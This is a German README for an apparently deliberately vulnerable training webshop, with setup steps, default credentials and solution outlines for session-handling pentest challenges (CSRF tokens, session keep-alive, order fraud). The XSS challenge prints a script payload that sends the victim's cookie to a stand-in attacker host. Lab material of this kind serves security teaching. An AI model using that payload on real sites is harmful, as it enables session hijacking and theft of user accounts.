[![Build Status](https://travis-ci.org/BenjiTrapp/Project-Makalu.svg?branch=master)](https://travis-ci.org/BenjiTrapp/Project-Makalu)
[![Dependency Status](https://dependencyci.com/github/BenjiTrapp/Project-Makalu/badge)](https://dependencyci.com/github/BenjiTrapp/Project-Makalu)

# Project [Makalu](https://de.wikipedia.org/wiki/Makalu) - An unsecure Webshop with an intentional broken Session Handling
Im Zuge des neuen Online Shops der **anna group** wird auch ein neues Session Handling benötigt. Der hier vorliegende 
Code steht kurz vor dem produktiven Livegang. Trotz der rapiden Entwicklung machen sich erhebliche Zweifel breit, ob
 nicht etwas wichtiges vergessen wurde?

### Motivation
Moderne WebApps verfügen teilweise über eine enorme Komplexität. Um den Kunden vor mögliche Angriffe zu schützen, benötigen unter anderem Requests die an eine WebApp gestellt werden eine Login-Session. Ein Request benötigt üblicherweise die Daten aus einer 
vorherigen Response (bspw. CSRF tokens). Die empfangenen Daten in einem Teilrequest, können auch einige Requests später noch 
benötigt werden wie zum Beispiel während des Checkout Prozesses. Dies macht den Einsatz von "unique" Namen/IDs während der Erstellung eines Requests notwendig. 
 
**Randbemerkung**: Das Fuzzing bspw. im Kontext eines CSRF tokens, erzeugt eine Vielzahl von Daten sowie Aufrufe innerhalb der WebApplikation. Dadurch kann im Falle eines Angriffs, die Performance der gesamten Applikation beeinträchtigen. Die Performance selbst,
steht in diesem Penetrationtests NICHT im Fokus, kann aber je nach gewählter Fuzzing-Methode zu einem "Problem" für den Angriff werden. 

## Problemstellung:
 Helfe der **anna group** durch einen Penetrationtest die Sicherheit des Session Handlings zu prüfen. Um diesen Wunsch
 nachzukommen muss zunächst die Applikation installiert und betriebsbereit gemacht werden. Hierbei hilft 
 sicherlich folgende Anleitung weiter:
 
## Installation & starten der WebApp
1. mittels Docker
     ```
     1. ``$ docker pull nyctophobia/project-makalu``
     2. ``$ docker run -d -p 4711:4711 project-makalu``
     3. Öffne im Browser: "http://localhost:4711"
     ```
2. mittels Docker Compose
     ```
     1. Git repository pullen von GitHub (git pull https://github.com/BenjiTrapp/Project-Makalu.git)
     2. In das Verzeichnis Wechseln
     3. ``docker-compose up``
     4. Öffne im Browser: "http://localhost:4711"
     ```
3. Lokal in der IDE
     ```
     1. Die Datei https://github.com/BenjiTrapp/Project-Makalu/blob/master/ProjectMakaluApp.py editieren: 
            Host in der Main Methode von 0.0.0.0 auf 127.0.0.1 abändern
     2. Editierte Main-Methode starten in der IDE z.B. PyCharm
     ```

#####  [Credentials](https://www.heise.de/security/meldung/hallo-ist-meistgenutztes-deutsches-Passwort-auf-Platz-zehn-steht-ficken-3579567.html): user/hallo

## Durchführung des Penetrationtests
Für den Test existiert folgende Use Cases. Zur Durchführung des Penetrationtests kann das File 
"/doc/Burp.burp-projectopts.json" mittels [Burp](https://portswigger.net/burp/freedownload/) als Projekt 
geladen werden. In der JSON-Datei sind alle "session handling rules" enthalten, um die nachfolgenden Challenges
zu lösen. Die Challenges können natürlich auch mit anderen Tools wie bspw. OWASP ZAP gelöst werden.

#### Use Case: Bau dir einen eigenen CSRF Token
```
[Challenge]: Der Übertragene CSRF Token muss übereinstimmen und mit jedem POST Request übertragen werden

[Lösung]:
* Capture des Requests von einem bestehenden CSRF Token
* Erstelle eine "Run a Macro" session handling Regel
    * Der Scope liegt auf den Parameter des CSRF Tokens
    * Update den CSRF Token NUR im aktuell gestellten Request
```

#### Use Case: Übernehme die Session eines anderen Users mittels [XSS-Lücke](https://www.owasp.org/index.php/Testing_for_Cross_site_scripting)

```
[Challenge]: Finde ein Eingabefeld, dass eine XSS-Lücke enthält und klaue damit die Session eines ahnungslosen Opfers

[Lösung]:
* Platziere an einer geeigneten Stelle ein inline JavaScript wie beispielsweise: 
    <script>window.location="http://evil.ru/?cookie=" + document.cookie;</script> 
* Extrahiere den erbeuteten Cookie aus dem Request und übernehme die Session 
```

#### Use Case: Behalte die Login-Session offen
```
[Challenge]: Mit einer Wahrscheinlichkeit von 5% beenden WebApplikationen die Login-Session

[Lösung]:
* Capture des Login-Requests in einem Makro
* Erstelle eine "Check Session is Valid" Regel
    * Erstelle einen Request
    * Prüfe den Response-Body nach einem Benutzernamen für die gültige Session
    * Alternativ: Prüfe die Umleitung der Login-URL (die Session muss für diesen Fall invalide sein)
    * Spiele das aufgezeichnete Makro ab bei der Invalidierung der Session
```
    
#### Use Case: Begehe Bestellbetrug 
```
[Challenge]: Führe multiple Requests durch bis die finale Bestellbestätigung erscheint

[Lösung]:
* Führe alle Requests durch bis einer mit Hilfe eines Makros gefuzzed werden kann.
* Finalisiere den Bestellbetrug mit einem "Run a Post-Request Macro", dass den aktuellen Request zurück gibt
* Definiere einen engen Definitionsbereich (URL, Parameter)
```

#### Use Case: Löschen von Eingefügten Daten
```
[Challenge]: Aktuell sind nur drei Einträge erlaubt. Um dies etwas gerechter zu machen, soll die "add" 
Funktionalität gefuzzed werden

[Lösung]:
* Lösche nachträglich gerade hinzugefügte Notizen 
    * Erstelle ein POST-request Makro, dass die Object ID extrahiert und anschließend den Löschvorgang anstößt.
```
